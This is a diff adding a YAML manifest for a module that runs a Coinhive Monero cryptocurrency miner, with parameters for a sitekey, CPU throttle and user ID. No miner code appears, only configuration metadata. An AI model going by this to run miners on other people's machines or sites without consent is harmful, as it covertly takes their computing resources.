@@ -1,0 +1,38 @@
+# Module name
+name: [coinhive, mine, monero]
+# Module description
+description: |
+  Coinhive monero cryptocurrency miner
+# Module author's GitHub username
+author: samdenty99
+# Run the module through a minifier
+minify: true
+
+
+# Module parameters
+params:
+  # Whether the parameters should be optional
+  optional: true
+  # Information about the params
+  info: |
+    Coinhive sitekey
+  # Typescript d.ts typings, used in the interface's code editor
+  typings: |
+    string | {
+      /**
+       * Coinhive sitekey
+       */
+      sitekey?: string
+      /**
+       * Throttle the cpu usage used
+       */
+      throttle?: number
+      /**
+       * Coinhive API's user integration
+       */
+       user: string | number
+    }
+
+# Module callback
+returns: |
+  boolean
